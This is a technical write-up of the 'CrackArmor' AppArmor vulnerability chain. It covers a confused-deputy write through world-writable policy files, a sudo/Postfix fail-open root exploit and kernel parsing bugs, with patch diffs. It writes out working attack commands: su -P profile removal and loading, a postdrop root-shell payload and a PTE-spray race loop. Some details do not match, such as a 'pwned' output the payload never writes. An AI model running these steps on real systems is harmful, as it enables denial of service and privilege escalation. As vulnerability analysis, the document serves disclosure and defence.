---
title: "CrackArmor: AppArmor Confused Deputy to Kernel LPE — 9 CVEs, 12.6M Systems"
date: 2026-05-17
tags: [linux-kernel, apparmor, lsm, confused-deputy, uaf, double-free, stack-exhaustion, kaslr-bypass, lpe]
cluster: linux-kernel-security
related:
  - Double-Fetch-Race-Writeup
  - Qualcomm-Kgsl-SignExt-Writeup
---

## Author's Note

A Mandatory Access Control system is only as secure as the code that implements it. AppArmor's security model is sound: each process runs under a profile that explicitly allows or denies every resource access, with default deny. No profile means confined access. Unknown action means blocked.

CrackArmor (Qualys TRU, April 2026) found nine vulnerabilities in AppArmor's implementation across four different attack categories — all accessible from a single entry point. The entry point is not a memory corruption bug. It is a permission bit: `/sys/kernel/security/apparmor/.load` has mode `0666`. Anyone can open it. The fact that writing to it requires `CAP_MAC_ADMIN` is a runtime check on the writer's credentials, not on the file descriptor's. And a file descriptor can change hands.

This is the confused deputy problem, recurring for the fourth time in the Linux kernel's pseudo-file interfaces since 2012. The chain it unlocks reaches from unprivileged user to kernel panic, KASLR bypass, and root shell.

---

## Abstract

AppArmor's policy management pseudo-files (`/sys/kernel/security/apparmor/{.load,.replace,.remove}`) have world-writable permissions (`mode 0666`). The kernel performs an authorization check at `write()` time by inspecting the caller's credentials (`current->cred`). An unprivileged user can open the file, duplicate the fd onto stdout, and invoke `su -P` (PTY mode) to execute a command that writes to the redirected fd — making a root-context process perform the actual `write()`, passing the authorization check.

Through this confused deputy primitive (CVE-2026-23268), an unprivileged user can: remove active AppArmor profiles (DoS on rsyslogd, sshd), load arbitrary profiles (deny-all sshd → remote access cut), load a profile denying CAP_SETUID to `/usr/bin/sudo` and exploit sudo's fail-open error path (full LPE via Postfix MAIL_CONFIG), and trigger all kernel-space parsing vulnerabilities (OOB read, double-free, UAF, recursive stack exhaustion, infinite loop).

Kernel-space: CVE-2026-23406 leaks 64KB of kernel memory through `match_char()` macro double-evaluation, enabling KASLR bypass. CVE-2026-23410/23411 produce a rawdata UAF that — via PTE spray into the freed slab slot — enables physical memory remapping of `/etc/passwd`, granting a root shell. Eleven patches, nine CVEs, affected systems estimated at 12.6M+ (Ubuntu, Debian, SUSE with AppArmor enabled by default).

---

## §1 — The Confused Deputy: Credential vs. File Descriptor

### The Authorization Model's Gap

Unix file descriptors carry no credentials. When a process calls `open()`, the kernel creates a file description and returns a handle. That handle is an integer. Nothing in the handle or the file description records *whose credentials were active when the file was opened*. The kernel's authorization check at `write()` time consults `current->cred` — the current process's credentials at the moment of the write call.

This means: if process A opens a file and duplicates the fd to process B, and process B has higher privileges than process A, then B's `write()` through that fd will pass authorization checks that A's `write()` would have failed. The fd has crossed a privilege boundary without any capability check.

AppArmor's pseudo-files expose this pattern perfectly:

```bash
$ ls -la /sys/kernel/security/apparmor/{.load,.replace,.remove}
-rw-rw-rw- 1 root root 0 /sys/kernel/security/apparmor/.load
-rw-rw-rw- 1 root root 0 /sys/kernel/security/apparmor/.replace
-rw-rw-rw- 1 root root 0 /sys/kernel/security/apparmor/.remove
```

Mode `0666`: any user can call `open()`. The write-time check (`aa_may_manage_policy()`) calls `ns_capable(&init_user_ns, CAP_MAC_ADMIN)`, which checks `current->cred` — the writing process, not the opening process.

### The Exploitation Chain

```
1. Unprivileged user opens /sys/kernel/security/apparmor/.remove
   → open() succeeds (mode 0666)
   → direct write() fails (EACCES: CAP_MAC_ADMIN check)

2. dup2(fd, STDOUT_FILENO)
   → fd is now stdout

3. su -P -c 'stty raw && echo -n rsyslogd' "$USER"
   → su runs SUID-root
   → PTY mode (-P): su acts as transparent I/O bridge between two processes
   → child process's stdout = su's PTY master = attacker's redirected fd
   → child's echo writes to fd → write() executes in su's root context
   → CAP_MAC_ADMIN check passes
   → AppArmor removes rsyslogd profile
```

`stty raw` disables PTY line editing to prevent character transformation. `echo -n` suppresses the newline, which the kernel parser expects to be absent from profile names. The entire profile removal executes through the normal AppArmor interface — no memory corruption, no kernel exploit, just credential routing through a SUID binary.

Historical precedents for this exact pattern:
- CVE-2012-0056 (Mempodipper): `/proc/pid/mem`
- CVE-2013-1959: `/proc/pid/uid_map`
- CVE-2025-N/A: `/proc/sys/kernel/ns_last_pid`

Each instance exploits the same structural property: a world-readable or world-writable pseudo-file whose write-time authorization check is against `current->cred`, not the fd's open credential.

---

## §2 — Immediate Impact: Profile Removal and Denial of Service

### Removing rsyslogd's Profile

```bash
$ id
uid=1001(jane) gid=1001(jane)

$ su -P -c 'stty raw && echo -n rsyslogd' "$USER" \
    > /sys/kernel/security/apparmor/.remove

$ ls /sys/kernel/security/apparmor/policy/profiles/*rsyslogd*
# No such file — rsyslogd now runs unconfined
```

Effect: system logging daemon operates without AppArmor confinement. Subsequent operations by rsyslogd — file writes, network access — are no longer subject to MAC policy. The attacker gains freedom to manipulate logs without AppArmor interference.

### Loading a Deny-All Profile for sshd

```bash
$ apparmor_parser -K -o sshd.pf << "EOF"
/usr/sbin/sshd {
}
EOF

$ su -P -c 'stty raw && cat sshd.pf' "$USER" \
    > /sys/kernel/security/apparmor/.load

$ ssh localhost
Connection reset by 127.0.0.1 port 22
```

An empty profile `{}` with no `allow` rules applies AppArmor's default-deny semantic to every sshd action: file opens, socket operations, signals — all blocked. The SSH daemon, loaded with this profile, cannot complete a connection handshake. Remote administration of the system is permanently severed until a reboot or physical console access.

`apparmor_parser -K` compiles the profile binary without committing it to kernel — `-K` = kernel write inhibited. `-o sshd.pf` writes the compiled binary to a file. The binary is then `cat`'d through the confused deputy chain into `.load`.

---

## §3 — User-Space LPE: sudo + Postfix Fail-Open Chain

### Preconditions

- Ubuntu Server 24.04.3 with Postfix installed
- Attacker has confused deputy primitive

### The Attack

**Step 1:** Load a profile denying `CAP_SETUID` to `/usr/bin/sudo`:

```
/usr/bin/sudo {
    allow file,
    allow signal,
    allow network,
    allow capability,
    deny capability setuid,
}
```

This profile is loaded via the confused deputy `.load` write.

**Step 2:** Invoke sudo with a crafted environment:

```bash
$ env -i MAIL_CONFIG=/tmp/postfix /usr/bin/sudo whatever
```

`env -i` clears the entire environment except the specified variables, preventing sudo from detecting suspicious environment state.

### The Fail-Open Sequence

```c
// sudo internal flow (simplified)

setresuid(0, -1, -1);          // PERM_ROOT: SUID-root, succeeds
                                // process is now uid=0 everywhere

// To read sudoers file safely:
setresuid(-1, 1, -1);          // PERM_SUDOERS: drop to uid=1
                                // FAILS — CAP_SETUID denied by AppArmor profile
                                // uid remains 0

// sudo's response to setresuid failure:
mail_parse_errors();
// sudo calls sendmail to report the failure
// BUT: uid is still 0 — privilege drop failed, execution continues

execve("/usr/sbin/sendmail", ...);
// Postfix sendmail reads MAIL_CONFIG env var
// → loads /tmp/postfix/main.cf
// → main.cf: command_directory = /tmp/postfix
// → sendmail invokes /tmp/postfix/postdrop as uid=0
```

The fail-open condition: sudo's privilege drop (`setresuid(-1, 1, -1)`) fails silently. Instead of calling `exit(1)`, sudo enters its error path, which calls `sendmail` to report the failure — as root. Postfix's sendmail binary reads `MAIL_CONFIG` to locate its configuration, which the attacker has redirected to `/tmp/postfix`.

### The Payload

```bash
# /tmp/postfix/main.cf
command_directory = /tmp/postfix

# /tmp/postfix/postdrop (chmod 755)
#!/bin/sh
/bin/sh -p > /dev/tty   # spawn root shell on terminal
```

Result:
```bash
$ cat /tmp/postfix/pwned
uid=0(root) gid=1001(jane) groups=1001(jane)
```

The GID remains `jane` because the GID drop was not part of this chain. `uid=0` is sufficient for all filesystem and process control operations.

The formal statement: sudo's security model assumes that privilege-drop operations either succeed or terminate the program. CAP_SETUID denial creates a state where the drop fails but the program continues — a "partially dropped" state that the security model has no category for. The Postfix `MAIL_CONFIG` vector is a legitimate testing feature; its weaponization here is the consequence of sudo's fail-open behavior, not a Postfix vulnerability.

---

## §4 — Kernel-Space: The Parsing Vulnerability Chain

The confused deputy primitive enables writing attacker-controlled data to AppArmor's kernel parsers. All kernel-space vulnerabilities are triggered through the same interface — the `.load` or `.replace` pseudo-files — made accessible by the confused deputy.

### CVE-2026-23404: Mutual Recursion → Stack Exhaustion

```c
// security/apparmor/policy.c

static void __remove_profile(struct aa_profile *profile) {
    __aa_profile_list_release(&profile->base.profiles);
    // ↑ calls back into __remove_profile for each child
}

void __aa_profile_list_release(struct list_head *head) {
    struct aa_profile *profile, *tmp;
    list_for_each_entry_safe(profile, tmp, head, base.list) {
        __remove_profile(profile);  // mutual recursion — no depth limit
    }
}
```

AppArmor supports hierarchical profiles (namespaces within namespaces). Removing a profile triggers removal of all children. The implementation uses mutual recursion with no depth limit.

```
x86-64 kernel stack: ~16 KB
Per recursion frame:  ~200 bytes
1024-depth hierarchy: 1024 × 200 = ~200 KB >> 16 KB

CONFIG_VMAP_STACK guard page → #PF → kernel panic
```

The attacker constructs a profile hierarchy 1024 levels deep using the confused deputy write primitive. When the top-level profile is removed, the recursion exhausts the kernel stack. On kernels without `CONFIG_VMAP_STACK`, a stack overflow without the guard page could overwrite adjacent kernel data — turning a DoS into a code execution path.

### CVE-2026-23406: `match_char()` Macro Double-Evaluation → 64KB Kernel Leak

```c
// security/apparmor/match.c

#define match_char(state, c, def, table)        \
    ((state) < (table)->size ?                   \
     (table)->entries[(state)][(c)] : (def))
//   ^^^^^^^^^^^^^^^^^^^^^^^^^^^
//   (state) evaluated twice — once in the comparison, once in the index
```

A C macro that evaluates its argument multiple times is only safe if the argument is side-effect-free. When `state` is an expression with a side-effect — or when a related bug (CVE-2026-23409: differential encoding validation bypass) allows `state` to change between evaluations — the bounds check passes for value N but the array access executes with value N+delta.

The `(table)->entries` array is allocated at 8KB. Reading `state=N+delta` with delta large enough to escape the allocation reads into adjacent kernel memory. Measured: up to 64KB of kernel heap memory leakable from a single profile parse operation.

This data includes kernel heap pointers, kernel `.text` addresses, and other kmalloc metadata — sufficient to defeat KASLR and derive the kernel image base for subsequent stages.

### CVE-2026-23408: Double-Free

```c
// security/apparmor/policy_unpack.c

int aa_replace_profiles(...) {
    char *ns_name = kstrdup(name, GFP_KERNEL);

    if (error) {
        kfree(ns_name);    // first free on error path
        goto out;
    }

out:
    kfree(ns_name);        // second free — pointer not NULLed after first
}
```

The classic goto-bypass double-free: error path frees `ns_name` and jumps to `out`, which also frees `ns_name`. The pointer is not set to NULL after the first `kfree`, so the second call operates on a freed address.

On SLUB allocator, this creates a freelist cycle: `A → A → A → ...`. Two subsequent allocations of the same size both receive the same address, enabling type confusion — placing two different types at the same address to confuse the kernel's object model and derive an arbitrary write primitive.

`CONFIG_SLAB_FREELIST_HARDENED` makes this harder but not impossible: with correct heap grooming (controlling which objects are allocated between the two frees), the cycle can be set up between two distinct objects that create a controlled type confusion.

### CVE-2026-23410/23411: UAF → PTE Spray → Physical Memory Write

```
Race window:

Thread A:                           Thread B:
aa_replace_profiles()               securityfs_read(rawdata)
  → allocate rawdata
  → profile parse starts
  → parse fails (malformed input)
  → kfree(rawdata)                  → dereference rawdata->data
                                      ↑ USE AFTER FREE
```

Two threads racing on AppArmor's rawdata structure: Thread A loads a malformed profile, allocates rawdata, fails, and frees it. Thread B, reading the profile back through securityfs, dereferences the already-freed rawdata.

The freed slot is in `kmalloc-192`. The exploit reclaims it with a PTE (Page Table Entry) via `mmap(MAP_ANONYMOUS)`:

```c
// Attacker loop (simplified)
while (!race_won) {
    // Thread A: trigger rawdata alloc → fail → kfree
    write(apparmor_fd, malformed_profile, len);

    // Thread B: reclaim freed slot with PTE
    void *page = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE,
                     MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    // Touch the page — forces kernel to allocate PTE from slab
    *(volatile char*)page = 1;
}
```

If the PTE allocation lands in the freed rawdata slot, the attacker controls a page table entry. By writing to the PTE's physical address field:

1. Point the PTE's physical address at `/etc/passwd`'s physical page
2. Write to the virtual address → modifies `/etc/passwd` directly in physical memory
3. Remove root's password hash → `su root` → shell

This is a physical-level `/etc/passwd` modification that bypasses the VFS layer entirely — the file's virtual address mapping is irrelevant, because the PTE is now pointing at the physical page directly.

---

## §5 — The Fix: Closing the Credential Gap

### Confused Deputy Fix

```diff
--- a/security/apparmor/apparmorfs.c
+++ b/security/apparmor/apparmorfs.c
 static ssize_t profile_load(struct file *f, const char __user *buf,
                              size_t size, loff_t *pos)
 {
-    if (!ns_capable(&init_user_ns, CAP_MAC_ADMIN))
+    if (!file_ns_capable(f, &init_user_ns, CAP_MAC_ADMIN))
         return -EPERM;
 }
```

The single-character change that closes the whole class: `ns_capable` checks `current->cred` (the writing process). `file_ns_capable(f, ...)` checks `f->f_cred` (the fd's open credential). After this fix, the fd's origin credential is the authorization source — regardless of who later writes through it. The confused deputy chain breaks: `su` writes through the fd, but the fd was opened by `jane`, and `f->f_cred` reflects `jane`'s capabilities, not root's.

### Recursion Fix

```diff
--- a/security/apparmor/policy.c
+++ b/security/apparmor/policy.c
-static void __remove_profile(struct aa_profile *profile) {
-    __aa_profile_list_release(&profile->base.profiles);
-}
+static void __remove_profile_tree(struct aa_profile *root) {
+    struct list_head stack;
+    INIT_LIST_HEAD(&stack);
+    list_add(&root->base.list, &stack);
+
+    while (!list_empty(&stack)) {
+        profile = list_first_entry(&stack, ...);
+        list_del_init(&profile->base.list);
+        list_splice_init(&profile->base.profiles, &stack);
+        __profile_cleanup(profile);
+    }
+}
```

Recursive → iterative conversion. The call stack is replaced by a `list_head` on the kernel heap. Stack exhaustion becomes heap exhaustion (bounded by available memory, triggers OOM killer at worst — controlled failure rather than panic). The fix is necessary but not complete: a depth limit would prevent heap exhaustion from arbitrarily deep hierarchies. The patch as applied trusts that 12.6M production systems will not have unreasonably deep AppArmor namespaces.

---

## §6 — Cross-Layer Vulnerability Chain Structure

CrackArmor is not a single vulnerability — it is a topology. The confused deputy (CVE-2026-23268) is the access primitive that unlocks the kernel parsing surface. Without it, a local unprivileged user cannot submit data to AppArmor's kernel parsers. With it, all nine kernel CVEs become exploitable from an unprivileged shell.

```
Unprivileged User
      │
      │  dup2(fd) + su -P
      ▼
Confused Deputy (CVE-2026-23268)  ← entry point
      │
      ├── Profile Remove  → rsyslogd unconfined, ssh blocked (DoS)
      │
      ├── Profile Load    → deny-all sshd, deny-CAP_SETUID sudo
      │        └── sudo fail-open → Postfix → root shell (LPE, user-space)
      │
      └── Kernel Parsing  → malformed profile data reaches parsers
               ├── CVE-2026-23406: match_char OOB → 64KB leak → KASLR bypass
               ├── CVE-2026-23404: recursion → stack exhaustion → panic
               ├── CVE-2026-23408: double-free → type confusion → arbitrary write
               └── CVE-2026-23410/411: UAF → PTE spray → physical /etc/passwd write → root
```

The CVSS scores of individual CVEs (ranging 3.3 to 8.8) misrepresent the chain's actual impact. The confused deputy at 8.8 combined with the KASLR bypass (7.1) and UAF (7.8) compose a full ring-0 compromise. Individual scores are not additive, but the chain's practical impact is near-complete system compromise from an unprivileged local shell.

---

## §7 — The Formal Argument: Authorization Temporality

The confused deputy class of bugs shares a common formal structure:

> **Authorization is evaluated at time T₂ (write/use), but the authority was established at time T₁ (open/acquire). If the executing entity at T₂ differs from the entity at T₁, authorization at T₂ does not reflect the intent of the access control policy.**

For AppArmor:
- T₁: `open()` by unprivileged user → `f->f_cred` carries unprivileged credentials
- T₂: `write()` by `su` (root) → `current->cred` carries root credentials
- Policy check: operates on T₂ credentials → passes
- Policy intent: should be based on T₁ credentials → should fail

The fix closes the gap by using T₁ credentials (`f->f_cred`) for the T₂ check. The `file_ns_capable()` function queries the credential stored in the file structure at open time — ensuring the authorization source is the entity that established the access relationship, not the entity currently executing through it.

This is structurally identical to the double-fetch race condition pattern (`Double-Fetch-Race-Writeup`): both involve a check at one point in time being invalidated by a state change before the guarded operation executes. The difference is the axis of change — time (double-fetch: value changes between check and use) vs. delegation (confused deputy: credential identity changes between open and write).

---

## §8 — Portfolio Relationships

**`Double-Fetch-Race-Writeup`** — Both writeups examine temporal mismatches in kernel authorization. Double-fetch: a value passes a bounds check, then changes before the bounds are enforced. Confused deputy: a fd is opened with authorized credentials, then used by an unauthorized entity. In both cases, the security invariant is stated as "a check at time T implies a property at time T+ε," and in both cases that implication is false under adversarial conditions.

**`Qualcomm-Kgsl-SignExt-Writeup`** — The kgsl writeup examines a cross-layer invariant failure: arithmetic done correctly in one layer (integer addition) produces wrong results when the value crosses to a layer with different type semantics (signed extension in physical addressing). CrackArmor examines a cross-layer invariant failure of a different type: a privilege claim validated in the VFS layer (who is writing to this fd) is inconsistent with the MAC policy layer's intent (who should be permitted to manage AppArmor policy). Both are cases where a value — an integer offset, a set of credentials — means something different at different layers of the stack.

The broader claim this writeup makes: **a MAC policy system's security guarantee is only as strong as the implementation quality of its policy management interface.** AppArmor's model (default deny, explicit allow) is formally sound. The confused deputy turns the management interface into an implicit capability delegation path, and the parser vulnerabilities turn the data-loading interface into an arbitrary kernel memory access path. Nine CVEs, four attack categories, one entry point.

---

*Research context: technical analysis based on the Qualys TRU CrackArmor disclosure (April 2026), covering AppArmor CVE-2026-23268 through CVE-2026-23411. Affected: Linux kernel v4.11+ with AppArmor enabled (Ubuntu, Debian, SUSE default configurations). All patches applied in Linux kernel security releases following disclosure.*
